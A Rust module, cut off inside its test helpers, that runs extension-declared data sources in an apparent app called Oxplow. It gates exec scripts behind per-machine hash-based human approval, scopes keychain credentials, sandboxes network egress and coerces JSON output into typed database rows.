//! Running extension-declared sources: consent, exec, coercion, storage.
//!
//! An `exec` source is a program an extension ships. It runs only
//! after a human approved that exact entry script (by content hash);
//! approvals live in this machine's `exec_consent::ApprovalStore`, outside
//! the repo, so each person consents on their own machine and again
//! whenever the script changes. The entry runs with a scrubbed
//! environment (PATH, HOME, the declared `env` names, its declared
//! `credentials` from the keychain, OXPLOW_* context) and must print `{"entities": {"<name>": [ {col: value, …}, … ]}}`.
//!
//! A `starlark` / `jaq` source is *derived*: its script gets the rows of
//! its read-only SQL `input` as `{"rows": [...]}` and returns the same
//! shape, in the collector sandbox (no files, network, env or secrets), so
//! it needs no approval.
//!
//! With `sync: upsert` the output may also carry
//! `"deleted": {"<name>": [key, …]}`; rows update by key and an entity the
//! run doesn't mention is left alone.
//! See `.context/semantic-layer.md` → "User and extension sources".

use std::collections::BTreeMap;
use std::path::Path;
use std::time::Duration;

use oxplow_ai::secrets::SecretStore;
use oxplow_db::{EntityTable, EntityWrite, SourceState, SqlCell, SqliteExtSourceStore, StoredType};
use oxplow_domain::DomainError;
use serde::{Deserialize, Serialize};

use crate::extension_sources::{ColumnType, SourceEntity, SourceRuntime, SourceSpec, SourceSync};

/// How long a source may run.
pub const SOURCE_TIMEOUT: Duration = Duration::from_secs(120);
/// Largest stdout a source may produce.
pub const MAX_OUTPUT_BYTES: usize = 64 * 1024 * 1024;
/// Local (gitignored) consent file under `.oxplow/` (see `exec_consent`).
pub use crate::exec_consent::LEGACY_APPROVALS_FILE;

/// Outcome of one run, as reported to the UI / agent.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct SourceRunReport {
    pub extension: String,
    pub source_id: String,
    pub row_counts: BTreeMap<String, i64>,
}

/// A declared source with its last run and consent status.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct SourceListing {
    pub extension: String,
    pub spec: SourceSpec,
    pub state: Option<SourceState>,
    /// This machine approved the entry script (and its `network` list) as
    /// it is now.
    pub approved: bool,
    /// Whether this OS enforces the source's `network` list.
    pub network_enforced: bool,
    /// Each declared credential and whether it has a value (never the value).
    pub credentials: Vec<CredentialStatus>,
    /// Its approval hash as it is now: the person's Approve & Run sends
    /// back the version they reviewed (tsk349). `None` for derived sources
    /// and unreadable entries.
    pub version: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct CredentialStatus {
    pub name: String,
    pub set: bool,
}

/// Where sources live and what running them needs.
pub struct Sources<'a> {
    /// The worktree whose `oxplow/extensions/` declares them.
    pub root: &'a Path,
    /// This project's key ([`project_key`]): credentials are scoped by it.
    pub project: String,
    /// This machine's approvals (outside the repo, see `exec_consent`).
    pub approvals: &'a crate::exec_consent::ApprovalStore,
    pub store: &'a SqliteExtSourceStore,
    /// Where credential values are kept (the OS keychain in the app).
    pub secrets: &'a dyn SecretStore,
    /// What a derived source's `input` is read through.
    pub layer: crate::sql_gateway::SqlGateway,
    /// The loaded-extensions cache (`Services.extension_catalog`).
    pub catalog: &'a crate::extension_catalog::ExtensionCatalog,
    /// What a derived source's `ai_*` builtins ask (recorded computations).
    pub ai: std::sync::Arc<crate::ai_compute::AiCompute>,
}

impl<'a> Sources<'a> {
    pub fn of(svc: &'a crate::Services, root: &'a Path) -> Self {
        Sources {
            root,
            project: project_key(&svc.layout.project_dir),
            approvals: &svc.approvals,
            store: &svc.ext_source_store,
            secrets: svc.secrets.as_ref(),
            layer: svc.sql.clone(),
            catalog: &svc.extension_catalog,
            ai: svc.ai_compute.clone(),
        }
    }
}

/// A short stable key for a project (its canonical path, hashed): what
/// credentials are scoped by, so a same-named extension in another repo
/// can't read this one's (tsk348). Every worktree of the project shares it.
pub fn project_key(project_dir: &Path) -> String {
    use sha2::{Digest, Sha256};
    let canon = project_dir
        .canonicalize()
        .unwrap_or_else(|_| project_dir.to_path_buf());
    hex::encode(Sha256::digest(canon.to_string_lossy().as_bytes()))[..16].to_string()
}

/// Keychain account for an extension's credential. Scoped by project and
/// extension, so neither another repo nor another extension can read it by
/// declaring the same name.
pub fn credential_account(project: &str, extension: &str, name: &str) -> String {
    format!("source:{project}:{extension}:{name}")
}

/// Set (or with `None`, clear) a credential some source or provider of
/// `extension` declares (both read the same keychain account). For the
/// person, from the UI; agents can't reach this.
pub fn set_source_credential(
    ctx: &Sources<'_>,
    extension: &str,
    name: &str,
    value: Option<&str>,
) -> Result<(), DomainError> {
    let ext = ctx
        .catalog
        .get(ctx.root)
        .iter()
        .find(|e| e.name == extension)
        .cloned()
        .ok_or(DomainError::NotFound)?;
    let declared = ext
        .sources
        .iter()
        .flat_map(|s| s.credentials.iter())
        .chain(ext.providers.iter().flat_map(|p| p.credentials.iter()))
        .any(|c| c == name);
    if !declared {
        return Err(DomainError::Invalid(format!(
            "no source or provider in `{extension}` declares a credential named `{name}`"
        )));
    }
    let account = credential_account(&ctx.project, extension, name);
    let result = match value.map(str::trim).filter(|v| !v.is_empty()) {
        Some(v) => ctx.secrets.set(&account, v),
        None => ctx.secrets.delete(&account),
    };
    result.map_err(|e| DomainError::Storage(e.to_string()))
}

/// Every declared source under `root`, with state and consent.
pub async fn list_sources(ctx: &Sources<'_>) -> Result<Vec<SourceListing>, DomainError> {
    let states = ctx.store.list_states().await?;
    let mut out = Vec::new();
    for ext in ctx.catalog.get(ctx.root).iter().cloned() {
        let ext_dir = ctx.root.join(&ext.path);
        for spec in ext.sources {
            // A derived source can't do anything an approval would guard.
            let version = (!spec.runtime.is_derived())
                .then(|| approval_hash(&ext_dir, &spec).ok())
                .flatten();
            let approved = spec.runtime.is_derived()
                || version
                    .as_ref()
                    .is_some_and(|h| is_approved(ctx.approvals, &ext.name, &spec.id, h));
            let state = states
                .iter()
                .find(|s| s.extension == ext.name && s.source_id == spec.id)
                .cloned();
            let credentials = spec
                .credentials
                .iter()
                .map(|name| CredentialStatus {
                    name: name.clone(),
                    set: ctx
                        .secrets
                        .get(&credential_account(&ctx.project, &ext.name, name))
                        .ok()
                        .flatten()
                        .is_some(),
                })
                .collect();
            out.push(SourceListing {
                extension: ext.name.clone(),
                spec,
                state,
                approved,
                network_enforced: crate::net_sandbox::enforced(),
                credentials,
                version,
            });
        }
    }
    Ok(out)
}

/// Sources the scheduler should run now: approved `every` sources that
/// never ran or last ran at least their interval before `now_ms`.
pub fn due_sources(listings: &[SourceListing], now_ms: i64) -> Vec<(String, String)> {
    listings
        .iter()
        .filter(|l| l.approved)
        .filter(|l| match l.spec.schedule {
            crate::extension_sources::SourceSchedule::Manual => false,
            crate::extension_sources::SourceSchedule::Every { minutes } => {
                let last_ms = l.state.as_ref().and_then(|s| {
                    serde_json::from_value::<oxplow_domain::Timestamp>(serde_json::Value::String(
                        s.last_run_at.clone(),
                    ))
                    .ok()
                    .map(|t| t.unix_ms())
                });
                last_ms.is_none_or(|last| now_ms - last >= i64::from(minutes) * 60_000)
            }
        })
        .map(|l| (l.extension.clone(), l.spec.id.clone()))
        .collect()
}

/// Background loop: once a minute, run every due source (see
/// [`due_sources`]) from the primary worktree, emitting `SourceSynced`
/// after each run. Unapproved sources never run here.
pub fn spawn_scheduler(state: std::sync::Arc<crate::Services>) {
    tokio::spawn(async move {
        // Stay out of boot's way.
        tokio::time::sleep(Duration::from_secs(30)).await;
        loop {
            let root = state.worktrees.resolve(None).await;
            let ctx = Sources::of(&state, &root);
            if let Ok(listings) = list_sources(&ctx).await {
                let now = oxplow_domain::Timestamp::now().unix_ms();
                for (extension, source_id) in due_sources(&listings, now) {
                    let result = run_source(&ctx, &extension, &source_id, None).await;
                    if let Err(e) = &result {
                        tracing::warn!(%extension, %source_id, error = ?e, "scheduled source run failed");
                    }
                    if result.as_ref().map_or_else(|e| e.ran(), |_| true) {
                        state.events.emit(crate::OxplowEvent::SourceSynced {
                            extension,
                            source_id,
                        });
                    }
                }
            }
            tokio::time::sleep(Duration::from_secs(60)).await;
        }
    });
}

/// SHA-256 of the entry script: what an approval is bound to.
pub fn entry_hash(ext_dir: &Path, entry: &str) -> std::io::Result<String> {
    use sha2::{Digest, Sha256};
    let bytes = std::fs::read(ext_dir.join(entry))?;
    Ok(hex::encode(Sha256::digest(&bytes)))
}

/// What an approval covers: every file in the extension (the entry and
/// any helper it runs, tsk347) and the hosts it may reach (tsk324), so a
/// changed helper or a widened `network` needs approving again.
///
/// The manifest and lenses aren't code the source runs, so editing a lens
/// doesn't ask again; what the manifest grants the source (its entry,
/// env passthrough, credentials and network, tsk348) is hashed from the
/// spec instead.
pub fn approval_hash(ext_dir: &Path, spec: &SourceSpec) -> std::io::Result<String> {
    use sha2::{Digest, Sha256};
    // The entry must exist; the tree hash alone wouldn't notice a typo.
    entry_hash(ext_dir, &spec.entry)?;
    let tree = crate::exec_consent::tree_hash_except(ext_dir, &|rel| {
        rel == Path::new("extension.yaml") || rel.starts_with("lenses")
    })?;
    let sorted = |v: &[String]| {
        let mut v = v.to_vec();
        v.sort();
        v.join(",")
    };
    let text = format!(
        "tree:{tree}\nentry:{}\nenv:{}\ncredentials:{}\nnetwork:{}",
        spec.entry,
        sorted(&spec.env),
        sorted(&spec.credentials),
        sorted(&spec.network)
    );
    Ok(hex::encode(Sha256::digest(text.as_bytes())))
}

/// How an exec source may reach the network.
#[derive(Debug, Clone)]
pub enum Egress {
    /// Unrestricted: an OS without enforcement, and tests of exec itself.
    Open,
    /// Under `sandbox-exec`, out only through the egress proxy these
    /// variables point at (see `net_sandbox`).
    Sandboxed { proxy_env: Vec<(String, String)> },
}

/// Whether `extension/source` is approved for this exact entry hash.
pub fn is_approved(
    approvals: &crate::exec_consent::ApprovalStore,
    extension: &str,
    source: &str,
    hash: &str,
) -> bool {
    approvals.is_approved(&format!("{extension}/{source}"), hash)
}

/// Record a human's approval of `extension/source` at `hash`.
pub fn approve(
    approvals: &crate::exec_consent::ApprovalStore,
    extension: &str,
    source: &str,
    hash: &str,
) -> std::io::Result<()> {
    approvals.approve(&format!("{extension}/{source}"), hash)
}

/// What a source run returns: rows per entity, and (with `sync: upsert`)
/// the keys to remove per entity.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct SourceOutput {
    pub entities: BTreeMap<String, Vec<serde_json::Value>>,
    #[serde(default)]
    pub deleted: BTreeMap<String, Vec<serde_json::Value>>,
}

impl SourceOutput {
    /// Parse and check against the declaration: only declared entities,
    /// and tombstones only for an upsert source.
    fn parse(spec: &SourceSpec, value: serde_json::Value) -> Result<Self, String> {
        let out: SourceOutput = serde_json::from_value(value).map_err(|e| {
            format!(
                "source `{}` must return JSON like {{\"entities\": {{\"<name>\": [...]}}}}: {e}",
                spec.id
            )
        })?;
        if let Some(unknown) = out
            .entities
            .keys()
            .chain(out.deleted.keys())
            .find(|k| !spec.entities.iter().any(|e| &e.name == *k))
        {
            return Err(format!(
                "source `{}` returned undeclared entity `{unknown}`",
                spec.id
            ));
        }
        if !out.deleted.is_empty() && spec.sync != SourceSync::Upsert {
            return Err(format!(
                "source `{}` returned `deleted`, which needs `sync: upsert`",
                spec.id
            ));
        }
        Ok(out)
    }
}

/// Run the entry and return its raw rows per entity.
pub fn exec_source(
    ext_dir: &Path,
    spec: &SourceSpec,
    host_env: &dyn Fn(&str) -> Option<String>,
    credentials: &BTreeMap<String, String>,
    timeout: Duration,
    egress: &Egress,
) -> Result<SourceOutput, String> {
    use std::io::Read;
    use std::process::{Command, Stdio};

    let entry = ext_dir.join(&spec.entry);
    if !entry.is_file() {
        return Err(format!(
            "entry `{}` doesn't exist in the extension folder",
            spec.entry
        ));
    }
    let mut cmd = match egress {
        Egress::Open => Command::new(&entry),
        Egress::Sandboxed { .. } => {
            let mut c = Command::new(crate::net_sandbox::SANDBOX_EXEC);
            c.arg("-p").arg(crate::net_sandbox::PROFILE).arg(&entry);
            c
        }
    };
    cmd.current_dir(ext_dir)
        .env_clear()
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .env("OXPLOW_EXTENSION_DIR", ext_dir)
        .env("OXPLOW_SOURCE_ID", &spec.id);
    for name in ["PATH", "HOME"] {
        if let Some(v) = host_env(name) {
            cmd.env(name, v);
        }
    }
    for name in &spec.env {
        if let Some(v) = host_env(name) {
            cmd.env(name, v);
        }
    }
    for (name, value) in credentials {
        cmd.env(name, value);
    }
    if let Egress::Sandboxed { proxy_env } = egress {
        for (name, value) in proxy_env {
            cmd.env(name, value);
        }
    }
    let mut child = cmd
        .spawn()
        .map_err(|e| format!("couldn't start `{}`: {e}", spec.entry))?;

    // Drain both pipes on threads so a chatty source can't deadlock.
    let mut out_pipe = child.stdout.take().ok_or("no stdout")?;
    let mut err_pipe = child.stderr.take().ok_or("no stderr")?;
    let out_thread = std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = out_pipe
            .by_ref()
            .take(MAX_OUTPUT_BYTES as u64 + 1)
            .read_to_end(&mut buf);
        buf
    });
    let err_thread = std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = err_pipe.by_ref().take(64 * 1024).read_to_end(&mut buf);
        buf
    });

    let started = std::time::Instant::now();
    let status = loop {
        match child.try_wait().map_err(|e| e.to_string())? {
            Some(status) => break status,
            None if started.elapsed() >= timeout => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!("source `{}` timed out after {timeout:?}", spec.id));
            }
            None => std::thread::sleep(Duration::from_millis(25)),
        }
    };
    let stdout = out_thread.join().unwrap_or_default();
    let stderr = String::from_utf8_lossy(&err_thread.join().unwrap_or_default())
        .trim()
        .to_string();
    if !status.success() {
        return Err(format!(
            "source `{}` failed ({status}, exit code {:?}): {stderr}",
            spec.id,
            status.code()
        ));
    }
    if stdout.len() > MAX_OUTPUT_BYTES {
        return Err(format!(
            "source `{}` printed more than {MAX_OUTPUT_BYTES} bytes",
            spec.id
        ));
    }
    let value: serde_json::Value = serde_json::from_slice(&stdout).map_err(|e| {
        format!(
            "source `{}` must print JSON like {{\"entities\": {{\"<name>\": [...]}}}}: {e}",
            spec.id
        )
    })?;
    SourceOutput::parse(spec, value)
}

/// Run a derived (starlark / jaq) source: read its `input` rows, then run
/// its script over `{"rows": [...]}` in the collector sandbox.
pub async fn derive_source(
    layer: &crate::sql_gateway::SqlGateway,
    script: String,
    spec: &SourceSpec,
    oracle: std::sync::Arc<dyn oxplow_collect_plugin::AiOracle>,
) -> Result<SourceOutput, String> {
    let rows = match &spec.input {
        None => Vec::new(),
        Some(sql) => {
            let limit = oxplow_db::semantic_layer::MAX_ROW_LIMIT;
            let out = layer
                .query_sql(sql, vec![], Some(limit))
                .await
                .map_err(|e| format!("source `{}` input: {e}", spec.id))?;
            if out.truncated {
                return Err(format!(
                    "source `{}` input returned more than {limit} rows; narrow it",
                    spec.id
                ));
            }
            out.rows
                .into_iter()
                .map(|r| {
                    serde_json::Value::Object(
                        out.columns
                            .iter()
                            .cloned()
                            .zip(
                                r.into_iter()
                                    .map(|c| serde_json::to_value(c).unwrap_or_default()),
                            )
                            .collect(),
                    )
                })
                .collect()
        }
    };
    let input = serde_json::json!({ "rows": rows });
    let runtime = spec.runtime;
    let value = tokio::task::spawn_blocking(move || {
        use oxplow_collect_plugin::runtime::{
            run_jaq, run_sandboxed_excluding, run_starlark_with_ai, SandboxBudget,
        };
        // The time its `ai_*` calls wait on a model isn't the script's.
        let host = std::sync::Arc::new(oxplow_collect_plugin::AiHost::new(oracle));
        let clock = host.clock();
        run_sandboxed_excluding(&SandboxBudget::default(), &clock, move || match runtime {
            SourceRuntime::Jaq => run_jaq(&script, &input),
            _ => run_starlark_with_ai(&script, &input, &host),
        })
    })
    .await
    .map_err(|e| format!("source task panicked: {e}"))?
    .map_err(|e| format!("source `{}`: {e}", spec.id))?;
    SourceOutput::parse(spec, value)
}

/// Coerce raw JSON rows to the entity's declared columns (in order).
pub fn coerce_rows(
    entity: &SourceEntity,
    rows: Vec<serde_json::Value>,
) -> Result<Vec<Vec<SqlCell>>, String> {
    use serde_json::Value;
    let mut out = Vec::with_capacity(rows.len());
    for (i, row) in rows.into_iter().enumerate() {
        let Value::Object(obj) = row else {
            return Err(format!(
                "entity `{}` row {i} must be an object",
                entity.name
            ));
        };
        let mut cells = Vec::with_capacity(entity.columns.len());
        for col in &entity.columns {
            let v = obj.get(&col.name).cloned().unwrap_or(Value::Null);
            let bad = || {
                format!(
                    "entity `{}` row {i}: column `{}` expects {:?}, got {v}",
                    entity.name, col.name, col.col_type
                )
            };
            let cell = match (&v, col.col_type) {
                (Value::Null, _) => SqlCell::Null(()),
                (Value::Number(n), ColumnType::Int) => SqlCell::Int(n.as_i64().ok_or_else(bad)?),
                (Value::Number(n), ColumnType::Real) => SqlCell::Real(n.as_f64().ok_or_else(bad)?),
                (Value::Bool(b), ColumnType::Bool) => SqlCell::Int(i64::from(*b)),
                (Value::String(s), ColumnType::Text | ColumnType::Time) => SqlCell::Text(s.clone()),
                _ => return Err(bad()),
            };
            if col.name == entity.key && cell == SqlCell::Null(()) {
                return Err(format!(
                    "entity `{}` row {i}: key `{}` is missing",
                    entity.name, entity.key
                ));
            }
            cells.push(cell);
        }
        out.push(cells);
    }
    Ok(out)
}

fn stored(t: ColumnType) -> StoredType {
    match t {
        ColumnType::Int | ColumnType::Bool => StoredType::Integer,
        ColumnType::Real => StoredType::Real,
        ColumnType::Text | ColumnType::Time => StoredType::Text,
    }
}

/// Why a source run didn't produce data.
#[derive(Debug)]
pub enum RunSourceError {
    /// No such extension or source.
    NotFound,
    /// Nobody on this machine approved the current entry script. Nothing ran.
    NeedsApproval(String),
    /// It ran (or tried to) and failed; recorded as the source's state.
    Failed(String),
    /// Oxplow's own storage failed.
    Storage(DomainError),
}

impl RunSourceError {
    /// Whether the source actually ran, so its data/state changed.
    pub fn ran(&self) -> bool {
        matches!(self, RunSourceError::Failed(_))
    }
}

impl From<RunSourceError> for DomainError {
    fn from(e: RunSourceError) -> Self {
        match e {
            RunSourceError::NotFound => DomainError::NotFound,
            RunSourceError::NeedsApproval(m) | RunSourceError::Failed(m) => DomainError::Invalid(m),
            RunSourceError::Storage(e) => e,
        }
    }
}

/// Run one source end to end: consent check (recording approval when a
/// person passed the `approve` version they reviewed, tsk349), exec,
/// coercion, atomic store, run state.
/// Failures after the consent check are also recorded as the source's
/// state so the UI can show them.
pub async fn run_source(
    ctx: &Sources<'_>,
    extension: &str,
    source_id: &str,
    reviewed: Option<&str>,
) -> Result<SourceRunReport, RunSourceError> {
    let (spec, output) = produce(ctx, extension, source_id, reviewed).await?;
    let result = match output {
        Ok(output) => store_output(extension, &spec, output, ctx.store).await,
        Err(e) => Err(e),
    };
    record(ctx.store, extension, source_id, result).await
}

/// Rows per entity a preview shows.
const PREVIEW_ROWS: usize = 50;

/// What a source would store, without storing it or recording a run:
/// how an agent checks a source it's writing in a worktree stream
/// (source data is project-wide, so a real run there would overwrite the
/// project's rows, tsk377). The same consent applies: an exec source
/// runs only at a version a person approved.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SourcePreview {
    pub extension: String,
    pub source_id: String,
    pub entities: Vec<EntityPreview>,
}

/// One entity of a [`SourcePreview`]: its first rows, coerced to the
/// declared columns.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EntityPreview {
    pub entity: String,
    pub view: String,
    pub columns: Vec<String>,
    /// At most [`PREVIEW_ROWS`].
    pub rows: Vec<Vec<SqlCell>>,
    /// Rows the run returned for it.
    pub total: usize,
    /// Keys an upsert run would delete.
    pub deleted: usize,
}

/// Run a source and return what it would store (see [`SourcePreview`]).
pub async fn preview_source(
    ctx: &Sources<'_>,
    extension: &str,
    source_id: &str,
) -> Result<SourcePreview, RunSourceError> {
    let (spec, output) = produce(ctx, extension, source_id, None).await?;
    let writes = plan_writes(extension, &spec, output.map_err(RunSourceError::Failed)?)
        .map_err(RunSourceError::Failed)?;
    let entities = writes
        .into_iter()
        .map(|(table, write)| {
            let (rows, deleted) = match write {
                EntityWrite::Replace(rows) => (rows, 0),
                EntityWrite::Upsert { rows, deleted } => (rows, deleted.len()),
            };
            EntityPreview {
                total: rows.len(),
                rows: rows.into_iter().take(PREVIEW_ROWS).collect(),
                deleted,
                columns: table.columns.iter().map(|c| c.name.clone()).collect(),
                entity: table.entity,
                view: table.view,
            }
        })
        .collect();
    Ok(SourcePreview {
        extension: extension.to_string(),
        source_id: source_id.to_string(),
        entities,
    })
}

/// Find a source in `ctx.root` and run it, stopping at its output. The
/// outer error means it didn't run (unknown, or not approved); the inner
/// one that it ran and failed.
async fn produce(
    ctx: &Sources<'_>,
    extension: &str,
    source_id: &str,
    reviewed: Option<&str>,
) -> Result<(SourceSpec, Result<SourceOutput, String>), RunSourceError> {
    let (root, approvals) = (ctx.root, ctx.approvals);
    let ext = ctx
        .catalog
        .get(root)
        .iter()
        .find(|e| e.name == extension)
        .cloned()
        .ok_or(RunSourceError::NotFound)?;
    let spec = ext
        .sources
        .iter()
        .find(|s| s.id == source_id)
        .cloned()
        .ok_or(RunSourceError::NotFound)?;
    let ext_dir = root.join(&ext.path);
    if spec.runtime.is_derived() {
        let output = match crate::extensions::read_extension_file(root, &ext.name, &spec.entry) {
            Some(script) => {
                let oracle = crate::ai_compute::CollectorOracle::new(
                    ctx.ai.clone(),
                    format!("source:{}/{}", ext.name, spec.id),
                );
                derive_source(&ctx.layer, script, &spec, std::sync::Arc::new(oracle)).await
            }
            None => Err(format!(
                "source `{source_id}`: entry `{}` doesn't exist in the extension",
                spec.entry
            )),
        };
        return Ok((spec, output));
    }
    let hash = approval_hash(&ext_dir, &spec).map_err(|e| {
        RunSourceError::Failed(format!("source `{source_id}`: entry `{}`: {e}", spec.entry))
    })?;
    if let Some(reviewed) = reviewed {
        if reviewed != hash {
            return Err(RunSourceError::NeedsApproval(format!(
                "source `{extension}/{source_id}` changed since you reviewed it; look at it \
                 again before approving"
            )));
        }
        approve(approvals, extension, source_id, &hash).map_err(|e| {
            RunSourceError::Storage(DomainError::Storage(format!("record approval: {e}")))
        })?;
    } else if !is_approved(approvals, extension, source_id, &hash) {
        return Err(RunSourceError::NeedsApproval(format!(
            "source `{extension}/{source_id}` runs `{}` and needs a person's approval first \
             (Settings → Data → Approve & Run). Approval is per machine and per script version.",
            spec.entry
        )));
    }

    let mut credentials = BTreeMap::new();
    let mut missing = None;
    for name in &spec.credentials {
        match ctx
            .secrets
            .get(&credential_account(&ctx.project, extension, name))
        {
            Ok(Some(v)) => {
                credentials.insert(name.clone(), v);
            }
            // Unset: the script decides (it may have a fallback).
            Ok(None) => {}
            Err(e) => missing = Some(format!("credential `{name}`: {e}")),
        }
    }
    let output = match missing {
        Some(e) => Err(e),
        None => exec_approved(&ext_dir, &spec, credentials).await,
    };
    Ok((spec, output))
}

/// Record a run's outcome as the source's state, then hand it back.
async fn record(
    store: &SqliteExtSourceStore,
    extension: &str,
    source_id: &str,
    result: Result<SourceRunReport, String>,
) -> Result<SourceRunReport, RunSourceError> {
    // Timestamp serializes as an RFC 3339 string.
    let now = serde_json::to_value(oxplow_domain::Timestamp::now())
        .ok()
        .and_then(|v| v.as_str().map(str::to_string))
        .unwrap_or_default();
    let state = match &result {
        Ok(report) => SourceState {
            extension: extension.to_string(),
            source_id: source_id.to_string(),
            status: "ok".into(),
            last_run_at: now,
            error: None,
            row_counts: report.row_counts.clone(),
        },
        Err(e) => SourceState {
            extension: extension.to_string(),
            source_id: source_id.to_string(),
            status: "error".into(),
            last_run_at: now,
            error: Some(e.clone()),
            row_counts: BTreeMap::new(),
        },
    };
    store
        .record_run(state)
        .await
        .map_err(RunSourceError::Storage)?;
    result.map_err(RunSourceError::Failed)
}

/// Run a project source from the primary worktree (source data is
/// project-wide) and announce `SourceSynced` when it actually ran (ok or
/// failed). A refused run (no consent) or unknown source changed nothing.
/// The one entry point for the IPC, MCP and lens-action runs.
pub async fn sync_source(
    svc: &crate::Services,
    extension: &str,
    source_id: &str,
    reviewed: Option<&str>,
) -> Result<SourceRunReport, RunSourceError> {
    let root = svc.worktrees.resolve(None).await;
    let result = run_source(&Sources::of(svc, &root), extension, source_id, reviewed).await;
    if result.as_ref().map_or_else(|e| e.ran(), |_| true) {
        svc.events.emit(crate::OxplowEvent::SourceSynced {
            extension: extension.to_string(),
            source_id: source_id.to_string(),
        });
    }
    result
}

/// Run an approved exec source and parse its output.
async fn exec_approved(
    ext_dir: &Path,
    spec: &SourceSpec,
    credentials: BTreeMap<String, String>,
) -> Result<SourceOutput, String> {
    let dir = ext_dir.to_path_buf();
    let spec_owned = spec.clone();
    // Where it's enforced, the program's only way out is a proxy that goes
    // just to its declared hosts; the proxy stops when this run ends.
    let proxy = if crate::net_sandbox::enforced() {
        Some(
            crate::net_sandbox::EgressProxy::start(spec.network.clone())
                .await
                .map_err(|e| format!("couldn't start the egress proxy: {e}"))?,
        )
    } else {
        None
    };
    let egress = match &proxy {
        Some(p) => Egress::Sandboxed { proxy_env: p.env() },
        None => Egress::Open,
    };
    let raw = tokio::task::spawn_blocking(move || {
        exec_source(
            &dir,
            &spec_owned,
            &|k| std::env::var(k).ok(),
            &credentials,
            SOURCE_TIMEOUT,
            &egress,
        )
    })
    .await
    .map_err(|e| format!("source task panicked: {e}"))??;
    Ok(raw)
}

/// Coerce a run's output to the declared entities and write it, per the
/// source's `sync` mode, atomically.
async fn store_output(
    extension: &str,
    spec: &SourceSpec,
    output: SourceOutput,
    store: &SqliteExtSourceStore,
) -> Result<SourceRunReport, String> {
    let writes = plan_writes(extension, spec, output)?;
    let names: Vec<String> = writes.iter().map(|(t, _)| t.entity.clone()).collect();
    let counts = store.write_rows(writes).await.map_err(|e| e.to_string())?;
    Ok(SourceRunReport {
        extension: extension.to_string(),
        source_id: spec.id.clone(),
        row_counts: names.into_iter().zip(counts).collect(),
    })
}

/// A run's output as the writes it makes, coerced to the declared columns.
fn plan_writes(
    extension: &str,
    spec: &SourceSpec,
    mut output: SourceOutput,
) -> Result<Vec<(EntityTable, EntityWrite)>, String> {
    let mut writes = Vec::new();
    for entity in &spec.entities {
        let rows = output.entities.remove(&entity.name);
        let write = match spec.sync {
            // An entity the source didn't mention this run is left empty.
            SourceSync::Replace => {
                EntityWrite::Replace(coerce_rows(entity, rows.unwrap_or_default())?)
            }
            SourceSync::Upsert => {
                let deleted = output.deleted.remove(&entity.name).unwrap_or_default();
                // Nothing said about it: leave it alone.
                if rows.is_none() && deleted.is_empty() {
                    continue;
                }
                EntityWrite::Upsert {
                    rows: coerce_rows(entity, rows.unwrap_or_default())?,
                    deleted: coerce_keys(entity, deleted)?,
                }
            }
        };
        writes.push((
            EntityTable {
                extension: extension.to_string(),
                entity: entity.name.clone(),
                view: entity.view.clone(),
                key: entity.key.clone(),
                description: entity_description(extension, entity),
                columns: entity
                    .columns
                    .iter()
                    .map(|c| oxplow_db::EntityColumn {
                        name: c.name.clone(),
                        stored: stored(c.col_type),
                        doc: c.doc.clone(),
                    })
                    .collect(),
            },
            write,
        ));
    }
    Ok(writes)
}

/// An entity's catalog description: its doc (or where it comes from),
/// then the joins it documents.
fn entity_description(extension: &str, entity: &SourceEntity) -> String {
    let mut out = if entity.doc.trim().is_empty() {
        format!(
            "`{}` records synced by the `{extension}` extension.",
            entity.name
        )
    } else {
        entity.doc.trim().to_string()
    };
    for r in &entity.relations {
        out.push_str(&format!(" Joins `{}` on `{}`.", r.to, r.on));
    }
    out
}

/// Coerce tombstone keys to the entity key column's type.
fn coerce_keys(
    entity: &SourceEntity,
    keys: Vec<serde_json::Value>,
) -> Result<Vec<SqlCell>, String> {
    let rows = keys
        .into_iter()
        .map(|k| serde_json::json!({ entity.key.clone(): k }))
        .collect();
    // Reuse the row coercion on one-column rows of just the key.
    let key_only = SourceEntity {
        columns: entity
            .columns
            .iter()
            .filter(|c| c.name == entity.key)
            .cloned()
            .collect(),
        ..entity.clone()
    };
    Ok(coerce_rows(&key_only, rows)?
        .into_iter()
        .filter_map(|mut r| r.pop())
        .collect())
}

#[cfg(test)]
mod tests {
    /// An `AiCompute` with no roles assigned (these sources don't call
    /// models).
    fn no_ai() -> std::sync::Arc<crate::ai_compute::AiCompute> {
        let db = oxplow_db::Database::in_memory();
        std::sync::Arc::new(crate::ai_compute::AiCompute::new(
            std::sync::Arc::new(crate::ai_service::AiService::new(
                oxplow_ai::client::Client::default(),
                std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
                std::sync::Arc::new(oxplow_db::SqliteAiCallStore::new(db.clone())),
                None,
            )),
            oxplow_db::SqliteAiResultStore::new(db),
        ))
    }

    use super::*;
    use crate::extension_sources::{parse_sources, SourceSchedule};
    use serde_json::json;

    /// The version a person would see in the listing right now.
    async fn version_of(ctx: &Sources<'_>, extension: &str, source: &str) -> String {
        list_sources(ctx)
            .await
            .unwrap()
            .into_iter()
            .find(|l| l.extension == extension && l.spec.id == source)
            .and_then(|l| l.version)
            .unwrap_or_default()
    }

    fn spec(entry: &str, env: &[&str]) -> SourceSpec {
        let yaml = format!(
            "- id: gh\n  runtime: exec\n  entry: {entry}\n  env: [{}]\n  entities:\n    - name: pr\n      key: number\n      columns: {{ number: int, title: text, score: real, draft: bool, opened_at: time }}\n",
            env.join(", ")
        );
        let (s, e) = parse_sources("my-gh", &serde_yaml::from_str(&yaml).unwrap());
        assert!(e.is_empty(), "{e:?}");
        s.into_iter().next().unwrap()
    }

    fn script(dir: &Path, name: &str, body: &str) {
        use std::os::unix::fs::PermissionsExt;
        let p = dir.join(name);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
